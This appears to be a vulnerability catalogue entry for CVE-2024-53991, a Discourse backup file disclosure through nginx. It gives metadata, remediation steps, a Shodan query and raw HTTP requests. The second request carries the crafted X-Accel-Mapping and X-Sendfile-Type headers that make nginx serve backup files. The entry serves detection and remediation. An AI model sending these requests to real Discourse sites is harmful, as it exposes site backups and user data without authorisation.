---
layout: "post"
cve_id: "CVE-2024-53991"
title: "Discourse Backup File Disclosure Via Default Nginx Configuration"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-53991.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-53991.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "high"
remediation: "This issue is patched in the latest stable, beta and tests-passed versions of Discourse. Users are advised to upgrade. Users unable to upgrade can either 1. Download all local backups on to another storage device, disable the `enable_backups` site setting and delete all backups until the site has been upgraded to pull in the fix. Or  2. Change the `backup_location` site setting to `s3` so that backups are stored and downloaded directly from S3.
"
reference:
  - "https://projectdiscovery.io/blog/discourse-backup-disclosure-rails-send_file-quirk/"
  - "https://github.com/discourse/discourse/security/advisories/GHSA-567m-82f6-56rv"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
  cvss-score: 7.5
  cve-id: "CVE-2024-53991"
  cwe-id: "CWE-200"
  epss-score: 0.38334
  epss-percentile: 0.97058
metadata:
  shodan-query: "http.component:\"Discourse\""
tags:
  - "cve"
  - "cve2024"
  - "discourse"
  - "disclosure"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
Discourse is an open source platform for community discussion. This vulnerability only impacts Discourse instances configured to use `FileStore--LocalStore` which means uploads and backups are stored locally on disk. If an attacker knows the name of the Discourse backup file, the attacker can trick nginx into sending the Discourse backup file with a well crafted request.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /vA5blb&cachebuster=36gqeR3V7ZkaKj7bbPovIlZnaS3 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Connection: close
X-Accel-Mapping: .*=/downloads/backups/default/
X-Sendfile-Type: X-Accel-Redirect
Accept-Encoding: gzip
```


